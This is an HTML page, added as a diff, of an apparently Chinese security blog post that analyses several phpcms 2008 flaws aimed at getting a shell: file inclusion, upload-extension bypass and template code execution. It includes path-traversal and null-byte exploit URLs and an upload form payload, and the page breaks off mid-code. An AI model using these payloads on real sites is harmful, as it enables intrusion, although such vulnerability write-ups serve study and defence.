@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="文件包含1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&amp;lt;?phpdefine(&apos;IN_YP&apos;, TRUE);define(&apos;ADMIN_ROOT&apos;, str_replace(&quot;\\&quot;,">
+<meta name="keywords" content="0day,getshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcms 2008多个漏洞 (可getshell)">
+<meta property="og:url" content="http://secoff.net/archives/13.html">
+<meta property="og:site_name" content="Security Off">
+<meta property="og:description" content="文件包含1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&amp;lt;?phpdefine(&apos;IN_YP&apos;, TRUE);define(&apos;ADMIN_ROOT&apos;, str_replace(&quot;\\&quot;,">
+<meta property="og:updated_time" content="2017-08-01T12:04:25.824Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpcms 2008多个漏洞 (可getshell)">
+<meta name="twitter:description" content="文件包含1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&amp;lt;?phpdefine(&apos;IN_YP&apos;, TRUE);define(&apos;ADMIN_ROOT&apos;, str_replace(&quot;\\&quot;,">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    
+    <title>phpcms 2008多个漏洞 (可getshell) | Security Off</title>
+    
+
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post" style="padding:40px;">
+<div id="nav" class="pull-right">
+  <ul>
+     <li class="icon">
+        <a href="javascript:history.go(-1)" title="Back"><i class="fa fa-mail-reply fa-5x"></i></a>
+     </li>
+  </ul>
+</div>
+  <!--
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  -->
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/archives/68.html"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/archives/6.html"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/13.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/13.html&text=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/13.html&is_video=false&description=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpcms 2008多个漏洞 (可getshell)&body=Check out this article: http://secoff.net/archives/13.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/13.html&title=phpcms 2008多个漏洞 (可getshell)"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/13.html&name=phpcms 2008多个漏洞 (可getshell)&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含"><span class="toc-number">1.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用注册一个企业用户"><span class="toc-number">2.</span> <span class="toc-text">利用注册一个企业用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#再看这一句"><span class="toc-number">3.</span> <span class="toc-text">再看这一句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#首先进入视线的是-admin-upload-inc-php-看名字就知道如果能利用的话，将会…-省略500字"><span class="toc-number">4.</span> <span class="toc-text">首先进入视线的是/admin/upload.inc.php 看名字就知道如果能利用的话，将会…..(省略500字)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#没什么好说的看EXP-上传后查看网页源代码即可找到上传路径"><span class="toc-number">5.</span> <span class="toc-text">没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。看144行左右，当-action-等于-post时。"><span class="toc-number">6.</span> <span class="toc-text">猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。看144行左右，当$action 等于 post时。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#是用来处理一些模板语法，完全不用理会。"><span class="toc-number">7.</span> <span class="toc-text">是用来处理一些模板语法，完全不用理会。</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    
+    <div class="content index width mx-auto px2 my4" style="max-width:58rem">
+    
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        phpcms 2008多个漏洞 (可getshell)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Security Off</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2012-08-07T10:44:12.000Z" itemprop="datePublished">2012-08-07</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/0day/">0day</a>, <a class="tag-link" href="/tags/getshell/">getshell</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">define(<span class="string">'IN_YP'</span>, <span class="keyword">TRUE</span>);</div><div class="line">define(<span class="string">'ADMIN_ROOT'</span>, str_replace(<span class="string">"\\"</span>, <span class="string">'/'</span>,dirname(<span class="keyword">__FILE__</span>)).<span class="string">'/'</span>);</div><div class="line"><span class="keyword">require</span> <span class="string">'../include/common.inc.php'</span>;</div><div class="line"></div><div class="line"><span class="comment">## 要登陆</span></div><div class="line"><span class="keyword">if</span>(!$_userid) showmessage(<span class="string">'您还没有登陆，即将跳转到登陆页面'</span>,$MODULE[<span class="string">'member'</span>][<span class="string">'url'</span>].<span class="string">'login.php?forward='</span>.urlencode(URL));</div><div class="line">session_start();</div><div class="line"></div><div class="line"><span class="comment">## $file变量可控制</span></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file) || <span class="keyword">empty</span>($file)) $file = <span class="string">'panel'</span>;</div><div class="line"></div><div class="line"><span class="comment">/* $company_user_infos 获取企业会员信息 */</span></div><div class="line">$company_user_infos = $db-&gt;get_one(<span class="string">"SELECT * FROM `"</span>.DB_PRE.<span class="string">"member_company` WHERE `userid`='$_userid'"</span>);</div><div class="line">$userid = $_userid;</div><div class="line"></div><div class="line"><span class="comment">## 注册的时候选择企业用户</span></div><div class="line"><span class="keyword">if</span>(!$company_user_infos)</div><div class="line">&#123;</div><div class="line">	$MS[<span class="string">'title'</span>] = <span class="string">'您不是企业会员'</span>;</div><div class="line">	$MS[<span class="string">'description'</span>] = <span class="string">'你可以做下面操作'</span>;</div><div class="line">	$MS[<span class="string">'urls'</span>][<span class="number">0</span>] = <span class="keyword">array</span>(</div><div class="line">		<span class="string">'name'</span>=&gt;<span class="string">'免费升级为企业会员'</span>,</div><div class="line">		<span class="string">'url'</span>=&gt;$PHPCMS[<span class="string">'siteurl'</span>].$M[<span class="string">'url'</span>].<span class="string">'company.php?action=member'</span>,</div><div class="line">		);</div><div class="line">	$MS[<span class="string">'urls'</span>][<span class="number">1</span>] = <span class="keyword">array</span>(</div><div class="line">		<span class="string">'name'</span>=&gt;<span class="string">'退出当前帐号，换其他帐号登陆'</span>,</div><div class="line">		<span class="string">'url'</span>=&gt;$PHPCMS[<span class="string">'siteurl'</span>].<span class="string">'member/logout.php'</span>,</div><div class="line">		);</div><div class="line">	$MS[<span class="string">'urls'</span>][<span class="number">2</span>] = <span class="keyword">array</span>(</div><div class="line">		<span class="string">'name'</span>=&gt;<span class="string">'重新注册为企业会员'</span>,</div><div class="line">		<span class="string">'url'</span>=&gt;$PHPCMS[<span class="string">'siteurl'</span>].<span class="string">'member/logout.php?forward='</span>.urlencode($PHPCMS[<span class="string">'siteurl'</span>].<span class="string">'member/register.php'</span>),</div><div class="line">		);</div><div class="line">	msg($MS);</div><div class="line">&#125;</div><div class="line">$CATEGORY = subcat(<span class="string">'yp'</span>);</div><div class="line">$siteurl = company_url($userid, $company_user_infos[<span class="string">'sitedomain'</span>]);</div><div class="line"></div><div class="line">$_SESSION[<span class="string">'url'</span>] = QUERY_STRING;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($file != <span class="string">'company'</span> &amp;&amp; $M[<span class="string">'enableSecondDomain'</span>] &amp;&amp; !$company_user_infos[<span class="string">'sitedomain'</span>]) showmessage(<span class="string">'请先绑定您的二级域名'</span>,BUSINESSDIR.<span class="string">'?file=company'</span>);</div><div class="line"></div><div class="line">check_priv($file);</div><div class="line">$GROUP = cache_read(<span class="string">'member_group.php'</span>);</div><div class="line"></div><div class="line"><span class="comment">## 此处直接包含了，注意$file是可以控制的但须要截断</span></div><div class="line"><span class="keyword">if</span>(!@<span class="keyword">include</span> ADMIN_ROOT.$file.<span class="string">'.inc.php'</span>) showmessage(<span class="string">'The file ./yp/'</span>.$file.<span class="string">'.inc.php is not exists!'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_priv</span><span class="params">($file)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">global</span> $M,$PHPCMS,$_groupid;</div><div class="line">	<span class="keyword">if</span>(!$M[<span class="string">"allow_add_$file"</span>]) <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">	<span class="keyword">if</span>(!in_array($_groupid,$M[<span class="string">"allow_add_$file"</span>]))</div><div class="line">	&#123;</div><div class="line">		$MS[<span class="string">'title'</span>] = <span class="string">'您所在的会员组没有此项操作权限'</span>;</div><div class="line">		$MS[<span class="string">'description'</span>] = <span class="string">'你可以做下面操作'</span>;</div><div class="line">		$MS[<span class="string">'urls'</span>][<span class="number">0</span>] = <span class="keyword">array</span>(</div><div class="line">			<span class="string">'name'</span>=&gt;<span class="string">'升级会员组'</span>,</div><div class="line">			<span class="string">'url'</span>=&gt;$PHPCMS[<span class="string">'siteurl'</span>].<span class="string">'member/upgrade.php'</span>,</div><div class="line">			);</div><div class="line">		$MS[<span class="string">'urls'</span>][<span class="number">1</span>] = <span class="keyword">array</span>(</div><div class="line">			<span class="string">'name'</span>=&gt;<span class="string">'返回商务中心'</span>,</div><div class="line">			<span class="string">'url'</span>=&gt;<span class="string">'?'</span>,</div><div class="line">			);</div><div class="line">		msg($MS);	</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="利用注册一个企业用户"><a href="#利用注册一个企业用户" class="headerlink" title="利用注册一个企业用户"></a>利用注册一个企业用户</h3><p>EXP:<a href="http://localhost/phpcms/yp/business/?file=../../xxoo.txt%00" target="_blank" rel="external">http://localhost/phpcms/yp/business/?file=../../xxoo.txt%00</a>.<br>由于涉及截断，所以鸡肋了，哥是要去拿shell的。</p>
+
+
+<h3 id="再看这一句"><a href="#再看这一句" class="headerlink" title="再看这一句"></a>再看这一句</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!@<span class="keyword">include</span> ADMIN_ROOT.$file.’.inc.php’) showmessage(‘The file ./yp/‘.$file.’.inc.php is not exists!’);</div><div class="line">以.inc.php结尾的文件有大把随便找个有漏的文件包含进来，不就能二次利用了？</div></pre></td></tr></table></figure>
+<h3 id="首先进入视线的是-admin-upload-inc-php-看名字就知道如果能利用的话，将会…-省略500字"><a href="#首先进入视线的是-admin-upload-inc-php-看名字就知道如果能利用的话，将会…-省略500字" class="headerlink" title="首先进入视线的是/admin/upload.inc.php 看名字就知道如果能利用的话，将会…..(省略500字)"></a>首先进入视线的是/admin/upload.inc.php 看名字就知道如果能利用的话，将会…..(省略500字)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</div><div class="line"></div><div class="line"><span class="keyword">require_once</span> <span class="string">'attachment.class.php'</span>;</div><div class="line"></div><div class="line">$attachment = <span class="keyword">new</span> attachment($mod);</div><div class="line"><span class="keyword">if</span>($catid)</div><div class="line">&#123;</div><div class="line">	$C = cache_read(<span class="string">'category_'</span>.$catid.<span class="string">'.php'</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment">## 允许上传的后缀是从$C里取的，变量$C要通过上面那个判断才能赋值，典型的变量未初始化</span></div><div class="line">$upload_allowext = $C[<span class="string">'upload_allowext'</span>] ? $C[<span class="string">'upload_allowext'</span>] : UPLOAD_ALLOWEXT;</div><div class="line">$upload_maxsize = $C[<span class="string">'upload_maxsize'</span>] ? $C[<span class="string">'upload_maxsize'</span>] : UPLOAD_MAXSIZE;</div><div class="line"><span class="keyword">if</span>($dosubmit)</div><div class="line">&#123;</div><div class="line">	$attachment-&gt;upload(<span class="string">'uploadfile'</span>, $upload_allowext, $upload_maxsize, <span class="number">1</span>);</div><div class="line">	<span class="keyword">if</span>($attachment-&gt;error) showmessage($attachment-&gt;error());</div><div class="line">	<span class="comment">//判断是否开启附件ftp上传，返回图片路径</span></div><div class="line">	$imgurl = UPLOAD_FTP_ENABLE ? $attachment-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'filepath'</span>] : UPLOAD_URL.$attachment-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'filepath'</span>];	</div><div class="line">	$aid = $attachment-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'aid'</span>];</div><div class="line">	$filesize = $attachment-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'filesize'</span>];</div><div class="line">	$filesize = $attachment-&gt;size($filesize);</div><div class="line">        <span class="keyword">if</span>($isthumb || $iswatermark)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">require_once</span> <span class="string">'image.class.php'</span>;</div><div class="line">		$image = <span class="keyword">new</span> image();</div><div class="line">		$img = UPLOAD_ROOT.$attachment-&gt;uploadedfiles[<span class="number">0</span>][<span class="string">'filepath'</span>];</div><div class="line">		<span class="keyword">if</span>($isthumb)</div><div class="line">		&#123;</div><div class="line">			$image-&gt;thumb($img, $img, $width, $height);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>($iswatermark)</div><div class="line">		&#123;</div><div class="line">			$image-&gt;watermark($img, $img, $PHPCMS[<span class="string">'watermark_pos'</span>], $PHPCMS[<span class="string">'watermark_img'</span>], <span class="string">''</span>, <span class="number">5</span>, <span class="string">'#ff0000'</span>, $PHPCMS[<span class="string">'watermark_jpgquality'</span>]);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	showmessage(<span class="string">"文件上传成功！&lt;script language='javascript'&gt;	try&#123; $(window.opener.document).find(\"form[@name='myform'] #$uploadtext\").val(\"$imgurl\");$(window.opener.document).find(\"form[@name='myform'] #&#123;$uploadtext&#125;_aid\").val(\"$aid\");$(window.opener.document).find(\"form[@name='myform'] #$filesize\").val(\"$filesize\");&#125;catch(e)&#123;&#125; window.close();&lt;/script&gt;"</span>, HTTP_REFERER);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">include</span> admin_tpl(<span class="string">'upload'</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="没什么好说的看EXP-上传后查看网页源代码即可找到上传路径"><a href="#没什么好说的看EXP-上传后查看网页源代码即可找到上传路径" class="headerlink" title="没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径."></a>没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form id=<span class="string">"frmUpload"</span> enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"http://localhost/phpcms/yp/business/?file=../../admin/upload&amp;C[upload_allowext]=php|Php%00.|php%00&amp;dosubmit=yes"</span> method=<span class="string">"post"</span>&gt;</div><div class="line"><span class="comment"># Upload a new file:</span></div><div class="line">&lt;input type=<span class="string">"file"</span> name=<span class="string">"uploadfile"</span> size=<span class="string">"50"</span>&gt;</div><div class="line">&lt;input id=<span class="string">"btnUpload"</span> type=<span class="string">"submit"</span> value=<span class="string">"Upload"</span>&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
+<p>传完后我才发现attachment.class.php 里有黑名单，怎么绕大家结合环境利用吧。<br>漏洞再一次被鸡肋化了，哥继续找。 再次进入视线的是block.inc.php，看名字貌似是跟模块有关的，难不成可以写个shell ?<br></p>
+
+<h3 id="猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。看144行左右，当-action-等于-post时。"><a href="#猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。看144行左右，当-action-等于-post时。" class="headerlink" title="猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。看144行左右，当$action 等于 post时。"></a>猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。看144行左右，当$action 等于 post时。</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'post'</span>:</div><div class="line">	<span class="keyword">require_once</span> <span class="string">'template.func.php'</span>;</div><div class="line">	<span class="keyword">if</span>($func == <span class="string">'dosave'</span>) <span class="comment">## 这里完全不用管他，让他进入else</span></div><div class="line">	&#123;</div><div class="line">		$block-&gt;set_template($blockid, $template);</div><div class="line">		$block-&gt;update($blockid, $data);</div><div class="line">		$data = $block-&gt;get_html($blockid);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		$name = new_stripslashes($name);</div><div class="line">		$data = new_stripslashes($data);</div><div class="line">		$data = $block-&gt;strip_data($data);</div><div class="line">		$template = new_stripslashes($template);</div><div class="line">		$tpldata = template_parse($template);</div><div class="line">		$tplfile = TPL_CACHEPATH.<span class="string">'block_'</span>.$blockid.<span class="string">'.preview.php'</span>; 	<span class="comment">## 文件名</span></div><div class="line">		file_put_contents($tplfile, $tpldata); 				<span class="comment">## 生成文件</span></div><div class="line">		<span class="keyword">include</span> $tplfile; 						<span class="comment">## 包含文件</span></div><div class="line">		@unlink($tplfile); 						<span class="comment">## 删除刚才生成的文件</span></div><div class="line">		$data = ob_get_contents();</div><div class="line">		ob_clean();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;script language="JavaScript"&gt;parent.'</span>.$func.<span class="string">'('</span>.$blockid.<span class="string">', "'</span>.format_js($data, <span class="number">0</span>).<span class="string">'");&lt;/script&gt;'</span>;</div><div class="line">	<span class="keyword">break</span>;</div></pre></td></tr></table></figure>
+<p></p><p><br>在这里可以生成一个php文件，并马上包含进来，随后又删除了。由于包含进来了，只要能控制php文件的内容，代码还是会被执行。<br>看取得文件内容的这一行，$tpldata = template_parse($template); 跟进template_parse函数<br></p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">template_parse</span><span class="params">($str, $istag = <span class="number">0</span>)</span></span></div><div class="line">&#123;</div><div class="line">	$str = preg_replace(<span class="string">"/([\n\r]+)\t+/s"</span>,<span class="string">"\\1"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&lt;\!\-\-\&#123;(.+?)\&#125;\-\-\&gt;/s"</span>, <span class="string">"&#123;\\1&#125;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;template\s+(.+)\&#125;/"</span>,<span class="string">"&lt;?php include template(\\1); ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;include\s+(.+)\&#125;/"</span>,<span class="string">"&lt;?php include \\1; ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;php\s+(.+)\&#125;/"</span>,<span class="string">"&lt;?php \\1?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;if\s+(.+?)\&#125;/"</span>,<span class="string">"&lt;?php if(\\1) &#123; ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;else\&#125;/"</span>,<span class="string">"&lt;?php &#125; else &#123; ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;elseif\s+(.+?)\&#125;/"</span>,<span class="string">"&lt;?php &#125; elseif (\\1) &#123; ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;\/if\&#125;/"</span>,<span class="string">"&lt;?php &#125; ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;loop\s+(\S+)\s+(\S+)\&#125;/"</span>,<span class="string">"&lt;?php if(is_array(\\1)) foreach(\\1 AS \\2) &#123; ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;loop\s+(\S+)\s+(\S+)\s+(\S+)\&#125;/"</span>,<span class="string">"&lt;?php if(is_array(\\1)) foreach(\\1 AS \\2 =&gt; \\3) &#123; ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;\/loop\&#125;/"</span>,<span class="string">"&lt;?php &#125; ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;\/get\&#125;/"</span>,<span class="string">"&lt;?php &#125; unset(\$DATA); ?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;tag_([^&#125;]+)\&#125;/e"</span>, <span class="string">"get_tag('\\1')"</span>, $str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;get\s+([^&#125;]+)\&#125;/e"</span>, <span class="string">"get_parse('\\1')"</span>, $str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^&#123;&#125;]*)\))\&#125;/"</span>,<span class="string">"&lt;?php echo \\1;?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;\\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^&#123;&#125;]*)\))\&#125;/"</span>,<span class="string">"&lt;?php echo \\1;?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;(\\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\&#125;/"</span>,<span class="string">"&lt;?php echo \\1;?&gt;"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;(\\$[a-zA-Z0-9_\[\]\'\"\$\x7f-\xff]+)\&#125;/es"</span>, <span class="string">"addquote('&lt;?php echo \\1;?&gt;')"</span>,$str);</div><div class="line">	$str = preg_replace(<span class="string">"/\&#123;([A-Z_\x7f-\xff][A-Z0-9_\x7f-\xff]*)\&#125;/s"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>,$str);</div><div class="line">	<span class="keyword">if</span>(!$istag) $str = <span class="string">"&lt;?php defined('IN_PHPCMS') or exit('Access Denied'); ?&gt;"</span>.$str;</div><div class="line">	<span class="keyword">return</span> $str;</div><div 